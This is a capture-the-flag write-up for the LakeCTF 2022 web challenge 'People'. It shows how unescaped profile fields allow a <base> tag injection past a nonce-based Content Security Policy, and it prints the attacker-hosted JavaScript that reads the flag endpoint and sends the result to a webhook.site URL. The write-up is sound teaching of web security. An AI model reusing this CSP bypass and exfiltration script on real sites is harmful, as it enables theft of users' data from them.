---
author: "Wen Junhua"
title: "[LAKECTF 2022] People"
date: 2022-09-27T00:00:00+08:00
description: "A Walkthrough of the LakeCTF 2022 on Web: People"
tags: ["writeups", "ctf", "web", "base injection"]
ShowBreadcrumbs: False
---

This is ported over from [my blog](https://jh123x.com). View the original post [here](https://jh123x.com/blog/2022-09-26/)

## Web: People

```
With the new People personal pages,
all the members of the EPFL community
can have their own page personalize it
with Markdown and much more...

http://chall.polygl0ts.ch:4000
```

This challenge involves a profile page that we can edit. There is also an admin who will visit our page when there is a profile that is reported.

The first thing that I though of was Cross Site Scripting. Usually, when there is an admin bot involve, chances are the website was vulnerable to cross site scripting.

Here is the website

![Website for CTF](/images/lakectf-people/signup%20page.png)

Scanning through the main file, I was looking for things that are user controlled inputs. If we take note of how the user inputs are treated. In this case these were the main code that we were looking at.

```python
...

@main.route('/signup', methods=['POST'])
@limiter.limit("4/minute")
def signup_post():
    email = request.form.get('email')
    password = request.form.get('password')
    fullname = request.form.get('fullname')
    title = request.form.get('title')
    lab = request.form.get('lab')
    bio = request.form.get('bio')

    user = User.query.filter_by(email=email).first()
    if user:
        flash('Email address already exists', 'danger')
        return redirect(url_for('main.signup'))

    new_user = User(id=secrets.token_hex(16),
                    email=email,
                    password=generate_password_hash(password),
                    fullname=fullname,
                    title=title,
                    lab=lab,
                    bio=bio)

    db.session.add(new_user)
    db.session.commit()

    login_user(new_user)

    return redirect(url_for('main.profile'))

...

@main.route('/edit', methods=['POST'])
@login_required
def edit_post():
    User.query.filter_by(id=current_user.id).update({
        'fullname': request.form.get('fullname'),
        'title': request.form.get('title'),
        'lab': request.form.get('lab'),
        'bio': request.form.get('bio')
    })
    db.session.commit()

    return redirect(url_for('main.profile'))

...
```

Looking at the functions above, we can see that they inputs from the users were not sanitized. This means that whatever we sent to might be loaded at some time later on. This seems like a good sign for Reflected XSS.

![Login page](/images/lakectf-people/login%20page.png)

After inspecting the webpage, we can see that some of our variables are on the page.

Now that we know that our inputs can be tainted, we need to take a look at where the results of our inputs are loaded.
The function mainly consists of the following code.

```python

...

@main.route('/profile', defaults={'user_id': None})
@main.route('/profile/<user_id>')
def profile(user_id):
    if user_id:
        user = User.query.filter_by(id=user_id).first()
        if not user:
            abort(404)
    elif current_user.is_authenticated:
        user = current_user
    else:
        return redirect(url_for('main.login'))

    return render_template('profile.html', user=user, own_profile=user == current_user)

...

```

This means that the variables were passed to the `profile.html` template which is rendered by `jinja2`.

In flask, the variables passed into it are autoescaped unless some instructions were used to unescape it, such as `|safe` or `{% autoescape false %}`. For more information you can refer to [jinja's documentation](https://jinja.palletsprojects.com/en/3.1.x/templates/#autoescape-extension).

```html
<dl class="definition-list definition-list-grid">
    <dt>Contact</dt>
    <dd class="flex">
        <a
        href="mailto:{{ user['email'] }}"
        class="btn btn-sm btn-primary"
        >
            {{ user['email'] }}
        </a>
    </dd>
</dl>

...

<dd class="flex">
    {% if own_profile %}
        <a href="{{ url_for('main.edit') }}" class="btn btn-sm btn-secondary">Edit profile</a>
    {% endif %}
    <form action="{{ url_for('main.report', _external=True, user_id=user['id']) }}" method="post">
        <button type="submit" class="btn btn-sm btn-secondary">Report profile</a>
    </form>
</dd>

...

        <div class="markdown">{{ user['bio'] }}</div>

...

{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
```

As we can see from the template, most of the variables are loaded into the template with sanitization except for `user['title'] and user['lab']`. This means that it was the only place for us to put our XSS payload.

![Burp Suit Track Request](/images/lakectf-people/burp%20edit%20page.png)

Using [Burp Suite](https://portswigger.net/burp), I manage to trace down the request to edit the page. By sending it to the repeater, we can edit the request later to edit our profile at will.

![Burp Suit Repeater page](/images/lakectf-people/burp%20repeater%20page.png)

From the repeater page, we can see that all of the fields are sent over in plain text. Although `title` and `lab` are implemented as dropdowns within the website, we are still able to send other different values through `burp`.

Time to send a script tag right?

![After sending script tag](/images/lakectf-people/script%20edit.png)

I was expecting to place a script there and call it a day, however, the flask file was protected by a [Content Security Policy](https://jh123x.com/blog/2021-12-02/)

```python
csp = {
    'script-src': '',
    'object-src': "'none'",
    'style-src': "'self'",
    'default-src': ['*', 'data:']
}
Talisman(app,
    force_https=False,
    strict_transport_security=False,
    session_cookie_secure=False,
    content_security_policy=csp,
    content_security_policy_nonce_in=['script-src'])
```

This means that any of the scripts that I include must contain a `nonce` and any other objects I used cannot have an external source.

Hmm, I was stuck. I cannot use `<script>` or `<img onerror='...'>` directly anymore. I needed another way to bypass this.

From the help of another CTF fellow player, I learnt that there was something called a `base` injection. A [`<base>` tag](https://www.w3schools.com/tags/tag_base.asp) can be injected into the website which makes it default all its import links to use that url as a base.

If I inject that into the title field, any subsequent script tags will import from that base instead.

Time to put that into action.

I uploaded by script to [github here](https://github.com/Jh123x/payload) and setup github pages to give me an ip address to use as a base. I also created a folder structure that corresponds to the path that the website is importing from.

```javascript
function httpGet(theUrl) {
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", theUrl, false); // false for synchronous request
  xmlHttp.send(null);
  return xmlHttp.responseText;
}
let payload1 = "/";
try {
  const resp456416512364p = httpGet("http://web:8080/flag");
  payload1 =
    "https://webhook.site/5e88af09-1ab7-408f-bf46-65e63746ee3e/?c=" +
    resp456416512364p;
} catch {
  console.log("Error");
}

const DOMPurify = {
  sanitize: () => {
    document.location.href = payload1;
  },
};

document.location.href = payload1;
```

In the script, I make a `GET` request to the location of the flag. If I am able to get the flag, I will send it to my webhook. If not, I will just redirect to the home page.

The url for the website is derived based on the admin bot script

```python

async def visit(user_id, admin_token):
    url = f'http://web:8080/profile/{user_id}'
    ...
    await page.setCookie({'name': 'admin_token', 'value': admin_token, 'url': 'http://web:8080', 'httpOnly': True, 'sameSite': 'Strict'})
    ...

```

TLDR: This admin script asks the bot to visit `web:8080` and set the cookie `admin_token` to the value of `admin_token`. This means that the bot will visit `web:8080/profile/{user_id}` with the admin cookie set.

```yaml
---
web:
  container_name: web
  build:
    context: .
    dockerfile: Dockerfile.web
  environment:
    - FLAG=EPFL{REDACTED}
  depends_on:
    - redis
  ports:
    - "8080:8080"
```

In docker, we can reference the ip of a container by using their container name. The admin bot visits `web:8080` as that is the configuration set in the `docker-compose.yml` file as shown above. So in this case, my script prompts a get request to `web:8080/flag` instead of the full url.

After that the request is attached as a query parameter to the base url of my webhook site and the page was subsequently redirected to it.

The github pages is available at [payload.jh123x.com](http://payload.jh123x.com/). It was time to inject my base and see the result on [webhook.site](https://webhook.site/).

The payload that I used for the base injection is shown below and the github link upload is hosted at that url.

```html
<base href="http://payload.jh123x.com/" />
```

After tinkering around for a few hours, I manage to get the redirect and the flag was mine.

![Final flag shown on webhook.site](/images/lakectf-people/final%20flag.png)

The flag is attached to the url as a query parameter

Flag: `EPFL{Th1s_C5P_byp4ss_1s_b4sed}`

If you want to try the challenge, you can find it [here](https://github.com/Jh123x/payload/raw/main/people.zip).

**Note** Not sure why but it took a few tries to get the flag to show up.
